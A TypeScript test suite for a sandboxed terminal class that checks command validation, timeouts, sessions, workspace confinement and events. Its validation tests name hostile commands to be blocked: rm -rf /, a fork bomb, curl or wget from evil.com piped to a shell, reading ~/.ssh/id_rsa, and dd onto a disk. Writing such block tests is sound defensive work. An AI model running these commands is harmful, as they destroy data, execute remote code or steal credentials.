/**
 * Tests for Sandboxed Terminal
 */

import { SandboxedTerminal, getSandboxedTerminal, resetSandboxedTerminal } from '../src/security/sandboxed-terminal';

describe('SandboxedTerminal', () => {
  let terminal: SandboxedTerminal;

  beforeEach(() => {
    resetSandboxedTerminal();
    terminal = new SandboxedTerminal({
      networkEnabled: false,
      timeoutMs: 5000,
    });
  });

  describe('Constructor', () => {
    it('should create with default config', () => {
      const defaultTerminal = new SandboxedTerminal();
      expect(defaultTerminal).toBeDefined();
    });

    it('should accept custom config', () => {
      const config = terminal.getConfig();
      expect(config.networkEnabled).toBe(false);
      expect(config.timeoutMs).toBe(5000);
    });
  });

  describe('validateCommand', () => {
    it('should allow safe commands', () => {
      const result = terminal.validateCommand('ls -la');
      expect(result.valid).toBe(true);
    });

    it('should block rm -rf /', () => {
      const result = terminal.validateCommand('rm -rf /');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('dangerous');
    });

    it('should block fork bomb', () => {
      const result = terminal.validateCommand(':(){ :|:& };:');
      expect(result.valid).toBe(false);
    });

    it('should block wget | sh', () => {
      const result = terminal.validateCommand('wget http://evil.com/script.sh | sh');
      expect(result.valid).toBe(false);
    });

    it('should block curl | bash', () => {
      const result = terminal.validateCommand('curl http://evil.com/script.sh | bash');
      expect(result.valid).toBe(false);
    });

    it('should block access to .ssh', () => {
      const result = terminal.validateCommand('cat ~/.ssh/id_rsa');
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('blocked path');
    });

    it('should block dd to device', () => {
      const result = terminal.validateCommand('dd if=/dev/zero of=/dev/sda');
      expect(result.valid).toBe(false);
    });
  });

  describe('execute', () => {
    it('should execute safe commands', async () => {
      const result = await terminal.execute('echo "hello"');

      expect(result.stdout).toContain('hello');
      expect(result.exitCode).toBe(0);
      expect(result.timedOut).toBe(false);
    });

    it('should reject dangerous commands', async () => {
      const result = await terminal.execute('rm -rf /');

      expect(result.exitCode).toBe(1);
      expect(result.stderr).toContain('dangerous');
    });

    it('should timeout long commands', async () => {
      const shortTimeout = new SandboxedTerminal({ timeoutMs: 100 });
      const result = await shortTimeout.execute('sleep 10');

      expect(result.timedOut).toBe(true);
    });

    it('should track duration', async () => {
      const result = await terminal.execute('echo "test"');

      expect(result.duration).toBeGreaterThanOrEqual(0);
    });
  });

  describe('session management', () => {
    it('should create session', () => {
      const session = terminal.createSession();

      expect(session.id).toBeDefined();
      expect(session.id).toMatch(/^sandbox_/);
      expect(session.commandHistory).toEqual([]);
    });

    it('should execute in session', async () => {
      const session = terminal.createSession();
      const result = await terminal.executeInSession(session.id, 'echo "test"');

      expect(result.stdout).toContain('test');
      expect(session.commandHistory).toContain('echo "test"');
    });

    it('should handle cd in session', async () => {
      const session = terminal.createSession();
      const result = await terminal.executeInSession(session.id, 'cd /tmp');

      expect(result.exitCode).toBe(0);
      expect(session.cwd).toContain('/tmp');
    });

    it('should block cd outside workspace', async () => {
      const session = terminal.createSession({ workspaceRoot: '/home/user/project' });
      const result = await terminal.executeInSession(session.id, 'cd /etc');

      expect(result.exitCode).toBe(1);
      expect(result.stderr).toContain('outside workspace');
    });

    it('should close session', () => {
      const session = terminal.createSession();
      terminal.closeSession(session.id);

      // Trying to execute should fail
      terminal.executeInSession(session.id, 'echo "test"').then(result => {
        expect(result.stderr).toContain('Session not found');
      });
    });

    it('should return error for invalid session', async () => {
      const result = await terminal.executeInSession('invalid-id', 'echo "test"');

      expect(result.exitCode).toBe(1);
      expect(result.stderr).toContain('Session not found');
    });
  });

  describe('getAvailableMethods', () => {
    it('should return array of methods', () => {
      const methods = terminal.getAvailableMethods();

      expect(Array.isArray(methods)).toBe(true);
      expect(methods).toContain('none');
    });
  });

  describe('formatStatus', () => {
    it('should return formatted status', () => {
      const status = terminal.formatStatus();

      expect(status).toContain('SANDBOXED TERMINAL STATUS');
      expect(status).toContain('Available methods');
      expect(status).toContain('Network');
    });
  });

  describe('updateConfig', () => {
    it('should update configuration', () => {
      terminal.updateConfig({ networkEnabled: true, timeoutMs: 10000 });

      const config = terminal.getConfig();
      expect(config.networkEnabled).toBe(true);
      expect(config.timeoutMs).toBe(10000);
    });
  });

  describe('events', () => {
    it('should emit exec:start event', (done) => {
      terminal.on('exec:start', (data) => {
        expect(data.command).toBeDefined();
        done();
      });

      terminal.execute('echo "test"');
    });

    it('should emit exec:complete event', (done) => {
      terminal.on('exec:complete', (data) => {
        expect(data.result).toBeDefined();
        done();
      });

      terminal.execute('echo "test"');
    });

    it('should emit session:created event', (done) => {
      terminal.on('session:created', (data) => {
        expect(data.sessionId).toBeDefined();
        done();
      });

      terminal.createSession();
    });
  });

  describe('singleton', () => {
    it('should return same instance', () => {
      const instance1 = getSandboxedTerminal();
      const instance2 = getSandboxedTerminal();
      expect(instance1).toBe(instance2);
    });

    it('should reset correctly', () => {
      const instance1 = getSandboxedTerminal();
      resetSandboxedTerminal();
      const instance2 = getSandboxedTerminal();
      expect(instance1).not.toBe(instance2);
    });
  });
});
